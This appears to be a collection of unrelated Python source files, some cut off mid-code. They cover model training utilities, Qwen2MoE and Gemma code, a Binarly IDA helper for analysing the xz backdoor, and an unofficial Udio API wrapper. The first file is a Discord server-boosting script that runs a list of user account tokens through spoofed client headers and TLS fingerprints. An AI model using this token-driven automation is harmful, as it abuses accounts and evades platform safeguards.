    "\"\"\"\nGNU License\n\nCopyright (c) 2022 DaniDuese\n\n\"\"\"\nfrom ab5 import hgratient\nfrom typing import Optional\nimport colorama\nimport sys\nfrom pystyle import Center, Colorate, Colors, Write\nimport tls_client\nimport os\n\n\ndef setTitle(title: Optional[any] = None):\n  os.system(\"title \"+title)\n\n\nsetTitle(\"BitBoost | Server Booster\")\n\n\ndef clear():\n  if sys.platform in [\"linux\", \"linux2\", \"darwin\"]:\n    os.system(\"clear\")\n  else:\n    os.system(\"cls\")\n\nclear()\n\nsub_ids = []\nlogo = (\"\"\"__________.__  __ __________                       __   \n\\______   \\__|/  |\\______   \\ ____   ____  _______/  |_ \n |    |  _/  \\   __\\    |  _//  _ \\ /  _ \\/  ___/\\   __\\ \n |    |   \\  ||  | |    |   (  <_> |  <_> )___ \\  |  |  \n |______  /__||__| |______  /\\____/ \\____/____  > |__|  \n        \\/                \\/                  \\/        \"\"\")\nbanner = (\"\"\"Please make sure that all your tokens are already in the server you want to boost.\\n\"\"\")\n\nprint(hgratient(logo, [0, 223, 50], [0, 25, 222]))\nprint(banner)\n__guild_id__ = Write.Input(\"Guild ID: \", Colors.blue_to_green, interval=0.05)\ncolorama.init(convert=True)\n\n\nclass Nitro:\n    def __init__(self, token: str):\n        self.token = token\n        self.headers = {\n            \"accept\": \"*/*\",\n            \"accept-encoding\": \"gzip, deflate, br\",\n            \"accept-language\": \"en-US\",\n            \"authorization\": token,\n            \"referer\": \"https://discord.com/channels/@me\",\n            \"sec-fetch-dest\": \"empty\",\n            \"sec-fetch-mode\": \"cors\",\n            \"sec-fetch-site\": \"same-origin\",\n            \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9007 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36\",\n            \"x-debug-options\": \"bugReporterEnabled\",\n            \"x-discord-locale\": \"en-US\",\n            \"x-super-properties\": \"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDA3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTYxODQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==\"\n        }\n        self.session = tls_client.Session(client_identifier=\"chrome_107\")\n        self.sub_ids = []\n\n    def removeTokenFromTxt(self):\n        with open(\"tokens.txt\", \"r\") as f:\n            lines = f.readlines()\n        with open(\"tokens.txt\", \"w\") as f:\n            for line in lines:\n                if line.strip(\"\\n\") != self.token:\n                    f.write(line)\n\n    def hasNitro(self):\n        sex = self.session.get(\n            \"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots\",\n            headers=self.headers,\n        )\n        if sex.status_code in [403, 401]:\n            return self._extracted_from_hasNitro_7('Token is invalid, removing.')\n        try:\n            for sub in sex.json():\n                self.sub_ids.append(sub[\"id\"])\n        except Exception as e:\n            print(e)\n            print(sex.text)\n        if len(self.sub_ids) == 0:\n            return self._extracted_from_hasNitro_7('Token has no nitro, removing.')\n        log(f\"{colorama.Fore.GREEN}Token has nitro.\")\n        return True\n\n    # TODO Rename this here and in `hasNitro`\n    def _extracted_from_hasNitro_7(self, arg0):\n        log(f\"{colorama.Fore.RED}{arg0}\")\n        self.removeTokenFromTxt()\n        return False\n\n    def boostServer(self, guildID):\n        for i in range(len(self.sub_ids)):\n            self.headers[\"Content-Type\"] = \"application/json\"\n            r = self.session.put(\n                url=f\"https://discord.com/api/v9/guilds/{guildID}/premium/subscriptions\",\n                headers=self.headers,\n                json={\n                    \"user_premium_guild_subscription_slot_ids\": [f\"{self.sub_ids[i]}\"]\n                },\n            )\n            if r.status_code == 201:\n                log(\n                    f\"{colorama.Fore.GREEN}Boosted {i + 1} of {len(sub_ids)} from {self.token[25:]}\"\n                )\n            elif r.status_code == 400:\n                log(\n                    f\"{colorama.Fore.YELLOW}Boost already used {i + 1} of {len(sub_ids)} from {self.token[25:]}\"\n                )\n            else:\n                log(f\"{colorama.Fore.RED}ERROR: {r.status_code}\")\n\n\ndef log(text):\n    print(f\"{text}{colorama.Fore.RESET}\")\n\n\ndef main():\n    with open(\"tokens.txt\", \"r\") as f:\n        tokens = f.read().splitlines()\n    for token in tokens:\n        nitro = Nitro(token)\n        if nitro.hasNitro():\n            nitro.boostServer(__guild_id__)\n\n\nif __name__ == \"__main__\":\n    main()\n    input(\"Press enter to exit.\")\n",
    "import os\nimport json\nfrom tqdm import tqdm\nimport random\nfrom copy import deepcopy\nfrom pprint import pprint\n\nimport numpy as np\nimport torch\nfrom torch.utils.data import Dataset\n\nfrom utils import print_rank_0\nfrom utils import read_json_or_jsonl_data\nfrom utils import DEFAULT_PAD_TOKEN, DEFAULT_BOS_TOKEN, DEFAULT_EOS_TOKEN, DEFAULT_UNK_TOKEN\nfrom utils import SEP_TOKEN, IGNORE_INDEX\n\n\nclass TextDataset(Dataset):\n    def __init__(self, data):\n        self.data = data \n\n    def __getitem__(self, index):\n        return self.data[index]\n\n    def __len__(self,):\n        return len(self.data)\n\n\ndef sft_data_collactor(args, batch, tokenizer):\n    input_ids, attention_mask, labels, weights, rewards = [], [], [], [], []\n\n    if args.debug_mode:\n        print_rank_0(\" >>>>> debug mode >>>>>\")\n        print_rank_0(\" >>>>> begin checking batch info:\")\n        print_rank_0(batch)\n\n    for item in batch:\n        if 'query' in item:\n            query = item['query']\n        elif 'prompt' in item:\n            query = item['prompt']\n        else:\n            query = item['text'][0].split(SEP_TOKEN)[0]\n            \n        query_ids = item['query_id'] if 'query_id' in item else query\n        \n        if 'target' in item:\n            target = item['target']\n        elif 'answer' in item:\n            target = item['answer']\n        else:\n            target_idx = np.argmax(item['scores'])\n            target = item['text'][target_idx].split(SEP_TOKEN)[-1]\n\n        query_token_ids = tokenizer.encode(query, add_special_tokens=False)\n        query_token_len = len(query_token_ids)\n        \n        target_token_ids = tokenizer.encode(target, add_special_tokens=False)\n\n        input_ids.append(\n            [tokenizer.bos_token_id] + deepcopy(query_token_ids) + deepcopy(target_token_ids)  + [tokenizer.eos_token_id]\n        )\n        labels.append(\n            [IGNORE_INDEX] * (query_token_len+1) + deepcopy(target_token_ids) + [tokenizer.eos_token_id]\n        )\n        \n    outputs = batch_padding(input_ids, tokenizer)\n    label_outputs = batch_padding(labels, tokenizer, pad_token_id=IGNORE_INDEX)\n        \n    outputs['labels'] = label_outputs['input_ids']\n\n    if args.debug_mode:\n        print_rank_0(\" >>>>>>> checking tokenization results\")\n        print_rank_0(outputs)\n    \n    return {\n        \"input_ids\": torch.Tensor(outputs['input_ids']).long(),\n        \"labels\": torch.Tensor(outputs['labels']).long(),\n        \"attention_mask\": torch.Tensor(outputs['attention_mask']).float(),\n    }\n\n\ndef weighted_sft_data_collactor(args, batch, tokenizer):\n    results = sft_data_collactor(args, batch, tokenizer)\n    weights = [item.get(\"weight\", 1.) for item in batch]\n    rewards = [item.get(\"reward\", 1.) for item in batch]\n    results['weights'] = torch.Tensor(weights).float()\n    results['rewards'] = torch.Tensor(rewards).float()\n    return results\n\n\ndef offline_ppo_data_collactor(args, batch, tokenizer):\n    results = weighted_sft_data_collactor(args, batch, tokenizer)\n    sft_mask = [ 1. if item.get('type', 'sample') == 'sft' else 0. for item in batch]\n    results['sft_mask'] = torch.Tensor(sft_mask).float()\n    return results\n    \n               \ndef batch_padding(input_ids, tokenizer, padding='longest', max_length=None, pad_token_id=None):\n    if pad_token_id is None:\n        pad_token_id = tokenizer.pad_token_id if tokenizer.pad_token_id is not None else 0\n\n    max_length = tokenizer.model_max_length if max_length is None else max_length\n    \n    if padding == 'longest':\n        max_input_length = max([len(inp_ids) for inp_ids in input_ids])\n        max_length = min(tokenizer.model_max_length, max_input_length)                \n\n    outputs = {\"input_ids\": [], \"attention_mask\": []}\n    for inp_ids in input_ids:        \n        attn_mask = [1] * len(inp_ids)\n        if len(inp_ids) >= max_length:\n            if tokenizer.truncation_side == 'left':\n                inp_ids = inp_ids[-max_length :]\n                attn_mask = attn_mask[-max_length :]\n            else:\n                inp_ids = inp_ids[:max_length]\n                attn_mask = attn_mask[:max_length]\n        else:\n            if tokenizer.padding_side == 'left':\n                inp_ids = [pad_token_id] * (max_length - len(inp_ids)) + inp_ids\n                attn_mask = [0] * (max_length - len(attn_mask)) + attn_mask\n            else:\n                inp_ids =  inp_ids + [pad_token_id] * (max_length - len(inp_ids)) \n                attn_mask = attn_mask + [0] * (max_length - len(attn_mask))\n\n        outputs['input_ids'].append(deepcopy(inp_ids))\n        outputs['attention_mask'].append(deepcopy(attn_mask))\n    return outputs\n\n\n\n    \n\n",
    "# Copyright 2024 Binarly REsearch\n#\n# https://github.com/binarly-io/binary-risk-intelligence/xz-backdoor\n\n# This script is used to simplify xz backdoor strings navigation in IDA\n\nimport string\n\nimport ida_allins\nimport ida_enum\nimport ida_funcs\nimport ida_kernwin\nimport ida_ua\nimport idaapi\nimport idautils\nimport idc\n\nimport xzbd_strings\n\ng_strings = {\n    xzbd_strings.h(bytes(r)): bytes(r).decode(errors=\"ignore\")\n    for r in xzbd_strings.invert()\n}\n\n\nclass MappingItem:\n    def __init__(\n        self, addr: int, string_id: int, string_value: str, func_name: str\n    ) -> None:\n        self.addr = f\"0x{addr:08x}\"\n        self.string_id = f\"0x{string_id:04x}\"\n        self.string_value = string_value\n        self.func_name = func_name\n\n\ndef _enum_name(input: str) -> str:\n    allowed = string.ascii_letters + string.digits\n    return \"STR_\" + \"\".join([c if c in allowed else \"_\" for c in input])\n\n\ndef _sanitize(input: str) -> str:\n    denied = \"\\n\\x00\"\n    return \"\".join([c if c not in denied else \"_\" for c in input])\n\n\ndef create_enum() -> bool:\n    name = \"BackdoorStrings\"\n    eid = idc.add_enum(-1, name, idaapi.hex_flag())\n    if eid & 0xFF == ida_enum.MAX_ENUM_SERIAL:\n        print(f\"[I] enum {name} is already exist\")\n        return False\n\n    for sid, svalue in g_strings.items():\n        idc.add_enum_member(enum_id=eid, name=_enum_name(svalue), value=sid, bmask=-1)\n\n    print(f\"[I] enum {name} is created\")\n\n    return True\n\n\ndef get_code_addrs() -> dict:\n    mapping = dict()\n    for addr in idautils.Functions():\n        f = ida_funcs.get_func(addr)\n        ea = f.start_ea\n        while ea <= f.end_ea:\n            ea = idc.next_head(ea)  # first instruction does not matter\n            insn = idaapi.insn_t()\n            idaapi.decode_insn(insn, ea)\n            if insn.itype not in (ida_allins.NN_cmp, ida_allins.NN_mov):\n                continue\n            if insn.ops[0].type != ida_ua.o_reg:\n                continue\n            op = insn.ops[1]\n            if op.type != ida_ua.o_imm or op.value not in g_strings:\n                continue\n            print(\n                f\"[I] {_sanitize(g_strings[op.value])} ({op.value:#x}) usage detected at {ea:#x}\"\n            )\n            mapping[ea] = MappingItem(\n                addr=ea,\n                string_id=op.value,\n                string_value=g_strings[op.value],\n                func_name=ida_funcs.get_func_name(ea),\n            )\n\n    return mapping\n\n\nclass bd_strings_t(ida_kernwin.Choose):\n    def __init__(self, title, mapping) -> None:\n        self._mapping = mapping\n        ida_kernwin.Choose.__init__(\n            self,\n            title,\n            [\n                [\"Address\", 10 | ida_kernwin.Choose.CHCOL_HEX],\n                [\"Function\", 30 | ida_kernwin.Choose.CHCOL_PLAIN],\n                [\"String\", 30 | ida_kernwin.Choose.CHCOL_PLAIN],\n                [\"Enum name\", 30 | ida_kernwin.Choose.CHCOL_PLAIN],\n                [\"ID\", 6 | ida_kernwin.Choose.CHCOL_HEX],\n            ],\n        )\n        self.items = list()\n\n    def _get_item(m: MappingItem):\n        return [\n            m.addr,\n            m.func_name,\n            _sanitize(m.string_value),\n            _enum_name(m.string_value),\n            m.string_id,\n        ]\n\n    def OnInit(self):\n        self.items = [bd_strings_t._get_item(m) for _ea, m in self._mapping.items()]\n        return True\n\n    def OnGetSize(self):\n        return len(self.items)\n\n    def OnGetLine(self, n):\n        return self.items[n]\n\n    def OnDeleteLine(self, n):\n        return (ida_kernwin.Choose.ALL_CHANGED, n)\n\n    def OnGetEA(self, n):\n        return int(self.items[n][0], 16)\n\n    def OnRefresh(self, n):\n        self.OnInit()\n        return [ida_kernwin.Choose.ALL_CHANGED] + self.adjust_last_item(n)\n\n    def OnClose(self):\n        print(\"closed \", self.title)\n\n\nif __name__ == \"__main__\":\n    create_enum()\n    c = bd_strings_t(\"xz backdoor strings list\", get_code_addrs())\n    c.Show(modal=False)\n",
    "# coding=utf-8\n# Copyright 2024 The Qwen team, Alibaba Group and the HuggingFace Inc. team. All rights reserved.\n#\n# This code is based on EleutherAI's GPT-NeoX library and the GPT-NeoX\n# and OPT implementations in this library. It has been modified from its\n# original forms to accommodate minor architectural differences compared\n# to GPT-NeoX and OPT used by the Meta AI team that trained the model.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\" PyTorch Qwen2MoE model.\"\"\"\nimport inspect\nimport math\nimport warnings\nfrom typing import List, Optional, Tuple, Union\n\nimport torch\nimport torch.nn.functional as F\nimport torch.utils.checkpoint\nfrom torch import nn\nfrom torch.nn import BCEWithLogitsLoss, CrossEntropyLoss, MSELoss\n\nfrom transformers.activations import ACT2FN\nfrom transformers.cache_utils import Cache, DynamicCache\nfrom transformers.modeling_attn_mask_utils import _prepare_4d_causal_attention_mask, _prepare_4d_causal_attention_mask_for_sdpa\nfrom transformers.modeling_outputs import MoeCausalLMOutputWithPast, MoeModelOutputWithPast, SequenceClassifierOutputWithPast\nfrom transformers.modeling_utils import PreTrainedModel\nfrom transformers.utils import (\n    add_start_docstrings,\n    add_start_docstrings_to_model_forward,\n    is_flash_attn_2_available,\n    is_flash_attn_greater_or_equal_2_10,\n    logging,\n    replace_return_docstrings,\n)\ntry:\n    from transformers.models.qwen2_moe.configuration_qwen2_moe import Qwen2MoeConfig # noqa\nexcept ImportError:\n    Qwen2MoeConfig = None\n\nif is_flash_attn_2_available():\n    from flash_attn import flash_attn_func, flash_attn_varlen_func\n    from flash_attn.bert_padding import index_first_axis, pad_input, unpad_input  # noqa\n\n    _flash_supports_window_size = \"window_size\" in list(inspect.signature(flash_attn_func).parameters)\n\nlogger = logging.get_logger(__name__)\n\n_CHECKPOINT_FOR_DOC = \"Qwen/Qwen1.5-MoE-A2.7B\"\n_CONFIG_FOR_DOC = \"Qwen2MoeConfig\"\n\nQWEN2MOE_PRETRAINED_MODEL_ARCHIVE_LIST = [\n    \"Qwen/Qwen1.5-MoE-A2.7B\",\n    # See all Qwen2 models at https://huggingface.co/models?filter=qwen2\n]\n\n\n# Copied from transformers.models.mixtral.modeling_mixtral.load_balancing_loss_func\ndef load_balancing_loss_func(\n    gate_logits: torch.Tensor, num_experts: torch.Tensor = None, top_k=2, attention_mask: Optional[torch.Tensor] = None\n) -> float:\n    r\"\"\"\n    Computes auxiliary load balancing loss as in Switch Transformer - implemented in Pytorch.\n\n    See Switch Transformer (https://arxiv.org/abs/2101.03961) for more details. This function implements the loss\n    function presented in equations (4) - (6) of the paper. It aims at penalizing cases where the routing between\n    experts is too unbalanced.\n\n    Args:\n        gate_logits (Union[`torch.Tensor`, Tuple[torch.Tensor]):\n            Logits from the `gate`, should be a tuple of model.config.num_hidden_layers tensors of\n            shape [batch_size X sequence_length, num_experts].\n        attention_mask (`torch.Tensor`, None):\n            The attention_mask used in forward function\n            shape [batch_size X sequence_length] if not None.\n        num_experts (`int`, *optional*):\n            Number of experts\n\n    Returns:\n        The auxiliary loss.\n    \"\"\"\n    if gate_logits is None or not isinstance(gate_logits, tuple):\n        return 0\n\n    if isinstance(gate_logits, tuple):\n        compute_device = gate_logits[0].device\n        concatenated_gate_logits = torch.cat([layer_gate.to(compute_device) for layer_gate in gate_logits], dim=0)\n\n    routing_weights = torch.nn.functional.softmax(concatenated_gate_logits, dim=-1)\n\n    _, selected_experts = torch.topk(routing_weights, top_k, dim=-1)\n\n    expert_mask = torch.nn.functional.one_hot(selected_experts, num_experts)\n\n    if attention_mask is None:\n        # Compute the percentage of tokens routed to each experts\n        tokens_per_expert = torch.mean(expert_mask.float(), dim=0)\n\n        # Compute the average probability of routing to these experts\n        router_prob_per_expert = torch.mean(routing_weights, dim=0)\n    else:\n        batch_size, sequence_length = attention_mask.shape\n        num_hidden_layers = concatenated_gate_logits.shape[0] // (batch_size * sequence_length)\n\n        # Compute the mask that masks all padding tokens as 0 with the same shape of expert_mask\n        expert_attention_mask = (\n            attention_mask[None, :, :, None, None]\n            .expand((num_hidden_layers, batch_size, sequence_length, top_k, num_experts))\n            .reshape(-1, top_k, ",
    "import mmap\nimport multiprocessing\nimport os\n\nCPU_COUNT = os.cpu_count()\nMMAP_PAGE_SIZE = os.sysconf(\"SC_PAGE_SIZE\")\n\n\ndef process_line(line, result):\n    idx = line.find(b\";\")\n\n    city = line[:idx]\n    temp_float = int(line[idx + 1 : -3] + line[-2:-1])\n\n    if city in result:\n        item = result[city]\n        item[0] += 1\n        item[1] += temp_float\n        item[2] = min(item[2], temp_float)\n        item[3] = max(item[3], temp_float)\n    else:\n        result[city] = [1, temp_float, temp_float, temp_float]\n\n\n# Will get OS errors if mmap offset is not aligned to page size\ndef align_offset(offset, page_size):\n    return (offset // page_size) * page_size\n\n\ndef process_chunk(file_path, start_byte, end_byte):\n    offset = align_offset(start_byte, MMAP_PAGE_SIZE)\n    result = {}\n\n    with open(file_path, \"rb\") as file:\n        length = end_byte - offset\n\n        with mmap.mmap(\n            file.fileno(), length, access=mmap.ACCESS_READ, offset=offset\n        ) as mmapped_file:\n            mmapped_file.seek(start_byte - offset)\n            for line in iter(mmapped_file.readline, b\"\\n\"):\n                process_line(line, result)\n    return result\n\n\ndef reduce(results):\n    final = {}\n    for result in results:\n        for city, item in result.items():\n            if city in final:\n                city_result = final[city]\n                city_result[0] += item[0]\n                city_result[1] += item[1]\n                city_result[2] = min(city_result[2], item[2])\n                city_result[3] = max(city_result[3], item[3])\n            else:\n                final[city] = item\n    return final\n\n\ndef read_file_in_chunks(file_path):\n    file_size_bytes = os.path.getsize(file_path)\n    base_chunk_size = file_size_bytes // CPU_COUNT\n    chunks = []\n\n    with open(file_path, \"r+b\") as file:\n        with mmap.mmap(\n            file.fileno(), length=0, access=mmap.ACCESS_READ\n        ) as mmapped_file:\n            start_byte = 0\n            for _ in range(CPU_COUNT):\n                end_byte = min(start_byte + base_chunk_size, file_size_bytes)\n                end_byte = mmapped_file.find(b\"\\n\", end_byte)\n                end_byte = end_byte + 1 if end_byte != -1 else file_size_bytes\n                chunks.append((file_path, start_byte, end_byte))\n                start_byte = end_byte\n\n    with multiprocessing.Pool(processes=CPU_COUNT) as p:\n        results = p.starmap(process_chunk, chunks)\n\n    final = reduce(results)\n\n    print(\n        \"{\",\n        \", \".join(\n            f\"{loc.decode()}={0.1*val[2]:.1f}/{(0.1*val[1] / val[0]):.1f}/{0.1*val[3]:.1f}\"\n            for loc, val in sorted(final.items())\n        ),\n        \"}\",\n        sep=\"\",\n    )\n\n\nif __name__ == \"__main__\":\n    read_file_in_chunks(\"data/measurements.txt\")\n",
    "import os\n\nos.environ[\"CUDA_VISIBLE_DEVICES\"] = \"0\"  # TODO: set the GPU device\n\nimport torch\nfrom torch.nn import functional as F\nfrom transformers import GemmaConfig, GemmaForCausalLM, AutoTokenizer, pipeline\n\nprint(\"Torch Version:\", torch.__version__)\nprint(\"CUDA:\", torch.cuda.is_available())\n\nif torch.cuda.is_available():\n    device = \"cuda:0\"  # set GPU device using CUDA_VISIBLE_DEVICES\nelse:\n    device = \"cpu\"\n\nconfig = GemmaConfig.from_pretrained(\n    \"google/gemma-2b\",\n    attn_implementation=\"eager\",\n)\nconfig.memory_size = 2048\nconfig.use_cache = True\nconfig.segment_size = 16\n\nprint(config)\n\n# Create the Gemma model with Infini-attention\nmodel = GemmaForCausalLM(config)\n# model = model.from_pretrained(\"google/gemma-2b\")\npretrained_model = GemmaForCausalLM.from_pretrained(\"google/gemma-2b\")\n# Step 4: Transfer weights\n# Note: This is a simplified example; you need to ensure that each parameter's dimensions match.\nfor param in model.named_parameters():\n    name = param[0]\n    if name in pretrained_model.state_dict():\n        # Check if dimensions match, and only then assign the weights\n        if param[1].size() == pretrained_model.state_dict()[name].size():\n            param[1].data = pretrained_model.state_dict()[name].data.clone()\n        else:\n            print(f\"Skipping {name} due to size mismatch.\")\nprint(model)\nmodel.to(device)\n\n# Generate some dummy input data\ntokenizer = AutoTokenizer.from_pretrained(\"google/gemma-2b\")\ntext = \"\"\"This work introduces an efficient method to scale Transformer-based\"\"\"\nlongtext = \"\"\"The new memory states M s and z s are then passed to the next segment S + 1, building in a recurrence in each attention layer. The right side term \u03c3 (K ) T V in Eq. (4) is known as an associative binding operator (Smolensky, 1990; Hebb, 2005; Schlag et al., 2020).\nInspired by the success of delta rule (Munkhdalai et al., 2019; Schlag et al., 2020; 2021), we have also incorporated it into our Infini-attention. The delta rule attempts a slightly improved memory update by first retrieving existing value entries and subtracting them from the new values before applying the associative bindings as new update.\"\"\"\n\nencoded = tokenizer(\n    text,\n    return_tensors=\"pt\",\n)\n# attention_mask = torch.ones_like(input_ids)\nencoded[\"labels\"] = encoded[\"input_ids\"].clone()\n\nlong_encoded = tokenizer(\n    longtext,\n    return_tensors=\"pt\",\n)\n# attention_mask = torch.ones_like(input_ids)\nlong_encoded[\"labels\"] = long_encoded[\"input_ids\"].clone()\n\nprint(encoded)\n# Test the forward pass\noutputs = model(**encoded.to(device))  # position_ids=position_ids)\nprint(\"Short Text Loss\")\nprint(outputs.loss)\noutputs.loss.backward()  # Test the backward pass\n\noutputs = model(**long_encoded.to(device))  # position_ids=position_ids)\nprint(\"Long Text Loss\")\nprint(outputs.loss)\noutputs.loss.backward()  # Test the backward pass\n\nprint(\"backprop done\")\n\n\n# Step 1: Get effective batch size and sequence length\nbatch_size = encoded[\"input_ids\"].shape[0]\nsequence_length = encoded[\"input_ids\"].shape[1]\n\n# Step 2: Prepare input data for generation\ninput_ids = encoded[\"input_ids\"]\nattention_mask = encoded.get(\"attention_mask\", None)\n\n# Step 3: Initialize past\npast = None\n\n# Step 4: Start generation loop\nfor _ in range(10):  # 10 is the number of new tokens to generate\n    with torch.no_grad():\n        # Get next token scores\n        outputs = model(\n            input_ids,\n            attention_mask=attention_mask,\n            use_cache=True,\n            past_key_values=past,\n        )\n        next_token_logits = outputs.logits[:, -1, :]\n        past = outputs.past_key_values\n\n        # Perform sampling to get the next token\n        next_token = torch.multinomial(\n            F.softmax(next_token_logits, dim=-1), num_samples=1\n        )\n\n        # Update input_ids, attention_mask, and past\n        input_ids = torch.cat([input_ids, next_token], dim=-1)\n        if attention_mask is not None:\n            attention_mask = F.pad(attention_mask, (0, 1), value=1)\n\n# Step 5: Return generated sequence\ngenerated_sequence = tokenizer.decode(input_ids[0], skip_special_tokens=False)\nprint(\"generated_sequence:\", generated_sequence)\n\n# Test .generate() method\ngenerated = model.generate(\n    **encoded,\n    max_new_tokens=32,\n    do_sample=True,\n    num_return_sequences=1,\n)\nprint(\"Generated:\")\nprint(tokenizer.decode(generated[0], skip_special_tokens=False))\n",
    "import torch, functools\nfrom torch import nn\nimport torch.nn.functional as F\nfrom torch_geometric.nn import MessagePassing\nfrom torch_scatter import scatter_add\n\ndef tuple_sum(*args):\n    '''\n    Sums any number of tuples (s, V) elementwise.\n    '''\n    return tuple(map(sum, zip(*args)))\n\ndef tuple_cat(*args, dim=-1):\n    '''\n    Concatenates any number of tuples (s, V) elementwise.\n    \n    :param dim: dimension along which to concatenate when viewed\n                as the `dim` index for the scalar-channel tensors.\n                This means that `dim=-1` will be applied as\n                `dim=-2` for the vector-channel tensors.\n    '''\n    dim %= len(args[0][0].shape)\n    s_args, v_args = list(zip(*args))\n    return torch.cat(s_args, dim=dim), torch.cat(v_args, dim=dim)\n\ndef tuple_index(x, idx):\n    '''\n    Indexes into a tuple (s, V) along the first dimension.\n    \n    :param idx: any object which can be used to index into a `torch.Tensor`\n    '''\n    return x[0][idx], x[1][idx]\n\ndef randn(n, dims, device=\"cpu\"):\n    '''\n    Returns random tuples (s, V) drawn elementwise from a normal distribution.\n    \n    :param n: number of data points\n    :param dims: tuple of dimensions (n_scalar, n_vector)\n    \n    :return: (s, V) with s.shape = (n, n_scalar) and\n             V.shape = (n, n_vector, 3)\n    '''\n    return torch.randn(n, dims[0], device=device), \\\n            torch.randn(n, dims[1], 3, device=device)\n\ndef _norm_no_nan(x, axis=-1, keepdims=False, eps=1e-8, sqrt=True):\n    '''\n    L2 norm of tensor clamped above a minimum value `eps`.\n    \n    :param sqrt: if `False`, returns the square of the L2 norm\n    '''\n    out = torch.clamp(torch.sum(torch.square(x), axis, keepdims), min=eps)\n    return torch.sqrt(out) if sqrt else out\n\ndef _split(x, nv):\n    '''\n    Splits a merged representation of (s, V) back into a tuple. \n    Should be used only with `_merge(s, V)` and only if the tuple \n    representation cannot be used.\n    \n    :param x: the `torch.Tensor` returned from `_merge`\n    :param nv: the number of vector channels in the input to `_merge`\n    '''\n    v = torch.reshape(x[..., -3*nv:], x.shape[:-1] + (nv, 3))\n    s = x[..., :-3*nv]\n    return s, v\n\ndef _merge(s, v):\n    '''\n    Merges a tuple (s, V) into a single `torch.Tensor`, where the\n    vector channels are flattened and appended to the scalar channels.\n    Should be used only if the tuple representation cannot be used.\n    Use `_split(x, nv)` to reverse.\n    '''\n    v = torch.reshape(v, v.shape[:-2] + (3*v.shape[-2],))\n    return torch.cat([s, v], -1)\n\nclass GVP(nn.Module):\n    '''\n    Geometric Vector Perceptron. See manuscript and README.md\n    for more details.\n    \n    :param in_dims: tuple (n_scalar, n_vector)\n    :param out_dims: tuple (n_scalar, n_vector)\n    :param h_dim: intermediate number of vector channels, optional\n    :param activations: tuple of functions (scalar_act, vector_act)\n    :param vector_gate: whether to use vector gating.\n                        (vector_act will be used as sigma^+ in vector gating if `True`)\n    '''\n    def __init__(self, in_dims, out_dims, h_dim=None,\n                 activations=(F.relu, torch.sigmoid), vector_gate=False):\n        super(GVP, self).__init__()\n        self.si, self.vi = in_dims\n        self.so, self.vo = out_dims\n        self.vector_gate = vector_gate\n        if self.vi: \n            self.h_dim = h_dim or max(self.vi, self.vo) \n            self.wh = nn.Linear(self.vi, self.h_dim, bias=False)\n            self.ws = nn.Linear(self.h_dim + self.si, self.so)\n            if self.vo:\n                self.wv = nn.Linear(self.h_dim, self.vo, bias=False)\n                if self.vector_gate: self.wsv = nn.Linear(self.so, self.vo)\n        else:\n            self.ws = nn.Linear(self.si, self.so)\n        \n        self.scalar_act, self.vector_act = activations\n        self.dummy_param = nn.Parameter(torch.empty(0))\n        \n    def forward(self, x):\n        '''\n        :param x: tuple (s, V) of `torch.Tensor`, \n                  or (if vectors_in is 0), a single `torch.Tensor`\n        :return: tuple (s, V) of `torch.Tensor`,\n                 or (if vectors_out is 0), a single `torch.Tensor`\n        '''\n        if self.vi:\n            s, v = x\n            v = torch.transpose(v, -1, -2)\n            vh = self.wh(v)    \n            vn = _norm_no_nan(vh, axis=-2)\n            s = self.ws(torch.cat([s, vn], -1))\n            if self.vo: \n                v = self.wv(vh) \n                v = torch.transpose(v, -1, -2)\n                if self.vector_gate: \n                    if self.vector_act:\n                        gate = self.wsv(self.vector_act(s))\n                    else:\n                        gate = self.wsv(s)\n                    v = v * torch.sigmoid(gate).unsqueeze(-1)\n                elif self.vector_act:\n                    v = v * self.vector_act(\n                        _norm_no_nan(v, axis=-1, keepdims=True))\n        else:\n            s = self.ws(x)\n            if self.vo:\n               ",
    "\"\"\"\nUdio Wrapper\nAuthor: Flowese\nVersion: 0.0.3\nDate: 2024-04-15\nDescription: Generates songs using the Udio API using textual prompts.\n\"\"\"\n\nimport requests\nimport os\nimport time\n\nclass UdioWrapper:\n    API_BASE_URL = \"https://www.udio.com/api\"\n\n    def __init__(self, auth_token):\n        self.auth_token = auth_token\n        self.all_track_ids = []\n\n    def make_request(self, url, method, data=None, headers=None):\n        try:\n            if method == 'POST':\n                response = requests.post(url, headers=headers, json=data)\n            else:\n                response = requests.get(url, headers=headers)\n            response.raise_for_status()\n            return response\n        except requests.exceptions.RequestException as e:\n            print(f\"Error making {method} request to {url}: {e}\")\n            return None\n\n    def get_headers(self, get_request=False):\n        headers = {\n            \"Accept\": \"application/json, text/plain, */*\" if get_request else \"application/json\",\n            \"Content-Type\": \"application/json\",\n            \"Cookie\": f\"; sb-api-auth-token={self.auth_token}\",\n            \"Origin\": \"https://www.udio.com\",\n            \"Referer\": \"https://www.udio.com/my-creations\",\n            \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\",\n            \"Sec-Fetch-Site\": \"same-origin\",\n            \"Sec-Fetch-Mode\": \"cors\",\n            \"Sec-Fetch-Dest\": \"empty\"\n        }\n        if not get_request:\n            headers.update({\n                \"sec-ch-ua\": '\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"',\n                \"sec-ch-ua-mobile\": \"?0\",\n                \"sec-ch-ua-platform\": '\"macOS\"',\n                \"sec-fetch-dest\": 